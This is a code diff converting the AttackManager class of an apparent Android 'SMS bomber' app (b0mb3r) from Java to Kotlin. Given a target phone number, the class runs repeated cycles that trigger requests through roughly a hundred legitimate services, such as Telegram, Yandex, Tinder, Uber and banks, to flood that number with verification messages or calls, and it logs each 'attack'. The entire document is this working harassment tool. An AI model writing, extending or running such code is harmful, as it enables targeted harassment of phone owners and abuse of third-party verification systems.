@@ -1,172 +1,160 @@
-package kotleni.b0mb3r;
+package kotleni.b0mb3r
 
-import android.util.Log;
-import androidx.annotation.NonNull;
-import kotleni.b0mb3r.services.*;
-import okhttp3.*;
-import org.jetbrains.annotations.NotNull;
+import android.util.Log
+import okhttp3.OkHttpClient.Builder
+import okhttp3.Interceptor.Chain
+import okhttp3.Request
+import okhttp3.Response
+import okhttp3.OkHttpClient
+import okhttp3.Dispatcher
+import kotleni.b0mb3r.AttackManager.Attack
+import kotleni.b0mb3r.AttackManager
+import kotleni.b0mb3r.services.*
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.Interceptor
+import java.io.IOException
+import java.util.ArrayList
+import java.util.concurrent.CountDownLatch
+import kotlin.Throws
 
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.concurrent.CountDownLatch;
-
-public class AttackManager {
-    private static final String TAG = "AttackManager";
-
-    private final Service[] services;
-
-    private Attack attack;
-    private final Callback callback;
-    private boolean ignoreCode;
-
-    public AttackManager(Callback callback) {
-        Service.client = new OkHttpClient.Builder()
-                .addInterceptor(new Interceptor() {
-                    @NonNull
-                    @Override
-                    public Response intercept(@NonNull Chain chain) throws IOException {
-                        Request request = chain.request();
-                        Log.v(TAG, String.format("Sending request %s", request.url()));
-
-                        Response response = chain.proceed(request);
-                        Log.v(TAG, String.format("Received response for %s with status code %s",
-                                response.request().url(), response.code()));
-
-                        return response;
-                    }
-                }).build();
-
-        this.callback = callback;
-        this.services = new Service[]{
-                new Kari(), new Modulebank(), new YandexEda(), new ICQ(),
-                new Citilink(), new GloriaJeans(), new Alltime(), new Mcdonalds(),
-                new Telegram(), new AtPrime(), new MTS(), new CarSmile(),
-                new Sravni(), new OK(), new SushiWok(), new Tele2(),
-                new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
-                new Fivepost(), new Askona(), new FarforCall(), new Sephora(),
-                new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
-                new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
-                new Zdravcity(), new Robocredit(), new Yandex(), new MegafonBank(),
-                new VoprosRU(), new InDriver(), new Tinder(), new Gosuslugi(),
-                new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
-                new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
-                new MegaDisk(), new KazanExpress(), new BudZdorov(), new FoodBand(),
-                new Benzuber(), new Verniy(), new Citimobil(), new HHru(),
-                new Ozon(), new Aushan(), new Uber(), new MFC(),
-                new Ostin(), new EKA(), new Neftm(), new Plazius(),
-                new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
-                new Mokka(), new SimpleWine(), new FarforSMS(), new Stolichki(),
-                new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
-                new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
-                new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
-                new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
-                new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
-                new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
-                new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
-                new TikTok(), new Zoloto585()
-        };
+class AttackManager(callback: Callback) {
+    private val services: Array<Service>
+    private var attack: Attack? = null
+    private val callback: Callback
+    private var ignoreCode = false
+    fun performAttack(phoneCode: String, phone: String?, cycles: Int) {
+        attack = Attack(phoneCode, phone, cycles)
+        attack!!.start()
     }
 
-    public void performAttack(String phoneCode, String phone, int cycles) {
-        attack = new Attack(phoneCode, phone, cycles);
-        attack.start();
+    fun setIgnoreCode(status: Boolean) {
+        ignoreCode = status
     }
 
-    public void setIgnoreCode(boolean status) {
-        ignoreCode = status;
+    fun hasAttack(): Boolean {
+        return attack != null && attack!!.isAlive
     }
 
-    public boolean hasAttack() {
-        return attack != null && attack.isAlive();
+    fun stopAttack() {
+        attack!!.interrupt()
+        Service.client.dispatcher.cancelAll()
     }
 
-    public void stopAttack() {
-        attack.interrupt();
-        Service.client.dispatcher().cancelAll();
-    }
-
-    public List<Service> getUsableServices(String phoneCode) {
-        List<Service> usableServices = new ArrayList<>();
-
-        for (Service service : services) {
-            if (ignoreCode || service.requireCode == null || service.requireCode.equals(phoneCode))
-                usableServices.add(service);
+    fun getUsableServices(phoneCode: String): List<Service> {
+        val usableServices: MutableList<Service> = ArrayList()
+        for (service in services) {
+            if (ignoreCode || service.requireCode == null || service.requireCode == phoneCode) usableServices.add(
+                service
+            )
         }
-
-        return usableServices;
+        return usableServices
     }
 
-    public interface Callback {
-        void onAttackEnd();
-
-        void onAttackStart(int serviceCount, int numberOfCycles);
-
-        void onProgressChange(int progress);
+    interface Callback {
+        fun onAttackEnd()
+        fun onAttackStart(serviceCount: Int, numberOfCycles: Int)
+        fun onProgressChange(progress: Int)
     }
 
-    private class Attack extends Thread {
-        private final String phoneCode;
-        private final String phone;
-        private final int numberOfCycles;
-
-        private int progress = 0;
-
-        private CountDownLatch tasks;
-
-        public Attack(String phoneCode, String phone, int cycles) {
-            super(phone);
-
-            this.phoneCode = phoneCode;
-            this.phone = phone;
-            this.numberOfCycles = cycles;
-        }
-
-        @Override
-        public void run() {
-            List<Service> usableServices = getUsableServices(phoneCode);
-
-            callback.onAttackStart(usableServices.size(), numberOfCycles);
-            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));
-
-            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
-                Log.i(TAG, String.format("Started cycle %s", cycle));
-
-                tasks = new CountDownLatch(usableServices.size());
-
-                for (Service service : usableServices) {
-                    service.prepare(phoneCode, phone);
-                    service.run(new okhttp3.Callback() {
-                        @Override
-                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
-                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
-
-                            tasks.countDown();
-                            callback.onProgressChange(progress++);
+    private inner class Attack(
+        private val phoneCode: String,
+        private val phone: String?,
+        private val numberOfCycles: Int
+    ) : Thread(
+        phone
+    ) {
+        private var progress = 0
+        private var tasks: CountDownLatch? = null
+        override fun run() {
+            val usableServices = getUsableServices(
+                phoneCode
+            )
+            callback.onAttackStart(usableServices.size, numberOfCycles)
+            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone))
+            for (cycle in 0 until numberOfCycles) {
+                Log.i(TAG, String.format("Started cycle %s", cycle))
+                tasks = CountDownLatch(usableServices.size)
+                for (service in usableServices) {
+                    service.prepare(phoneCode, phone)
+                    service.run(object : okhttp3.Callback {
+                        override fun onFailure(call: Call, e: IOException) {
+                            Log.e(TAG, String.format("%s returned error", service.javaClass.name), e)
+                            tasks!!.countDown()
+                            callback.onProgressChange(progress++)
                         }
 
-                        @Override
-                        public void onResponse(@NotNull Call call, @NotNull Response response) {
-                            if (!response.isSuccessful()) {
-                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
-                                        service.getClass().getName(), response.code()));
+                        override fun onResponse(call: Call, response: Response) {
+                            if (!response.isSuccessful) {
+                                Log.i(
+                                    TAG, String.format(
+                                        "%s returned an error HTTP code: %s",
+                                        service.javaClass.name, response.code
+                                    )
+                                )
                             }
-
-                            tasks.countDown();
-                            callback.onProgressChange(progress++);
+                            tasks!!.countDown()
+                            callback.onProgressChange(progress++)
                         }
-                    });
+                    })
                 }
-
                 try {
-                    tasks.await();
-                } catch (InterruptedException e) {
-                    break;
+                    tasks!!.await()
+                } catch (e: InterruptedException) {
+                    break
                 }
             }
-
-            callback.onAttackEnd();
-            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
+            callback.onAttackEnd()
+            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone))
         }
+    }
+
+    companion object {
+        private const val TAG = "AttackManager"
+    }
+
+    init {
+        Service.client = Builder()
+            .addInterceptor(Interceptor { chain ->
+                val request = chain.request()
+                Log.v(TAG, String.format("Sending request %s", request.url))
+                val response = chain.proceed(request)
+                Log.v(
+                    TAG, String.format(
+                        "Received response for %s with status code %s",
+                        response.request.url, response.code
+                    )
+                )
+                response
+            }).build()
+        this.callback = callback
+        services = arrayOf(
+            Kari(), Modulebank(), YandexEda(), ICQ(),
+            Citilink(), GloriaJeans(), Alltime(), Mcdonalds(),
+            Telegram(), AtPrime(), MTS(), CarSmile(),
+            Sravni(), OK(), SushiWok(), Tele2(),
+            Eldorado(), Tele2TV(), MegafonTV(), YotaTV(),
+            Fivepost(), Askona(), FarforCall(), Sephora(),
+            Ukrzoloto(), Olltv(), Wink(), Lenta(),
+            Pyaterochka(), ProstoTV(), Multiplex(), RendezVous(),
+            Zdravcity(), Robocredit(), Yandex(), MegafonBank(),
+            VoprosRU(), InDriver(), Tinder(), Gosuslugi(),
+            Hoff(), N1RU(), Samokat(), GreenBee(),
+            ToGO(), Premier(), Gorparkovka(), Tinkoff(),
+            MegaDisk(), KazanExpress(), BudZdorov(), FoodBand(),
+            Benzuber(), Verniy(), Citimobil(), HHru(),
+            Ozon(), Aushan(), Uber(), MFC(),
+            Ostin(), EKA(), Neftm(), Plazius(),
+            VKWorki(), Magnit(), SberZvuk(), Smotrim(),
+            Mokka(), SimpleWine(), FarforSMS(), Stolichki(),
+            BApteka(), HiceBank(), Evotor(), Sportmaster(),
+            RiveGauche(), Yarche(), Baucenter(), Dolyame(),
+            GoldApple(), FriendsClub(), ChestnyZnak(), DvaBerega(),
+            MoeZdorovie(), Sokolov(), Boxberry(), Discord(),
+            Privileges(), NearKitchen(), Citydrive(), BelkaCar(),
+            Mozen(), MosMetro(), BCS(), Dostavista(),
+            Metro(), Niyama(), RabotaRu(), Sunlight(),
+            TikTok(), Zoloto585()
+        )
     }
 }
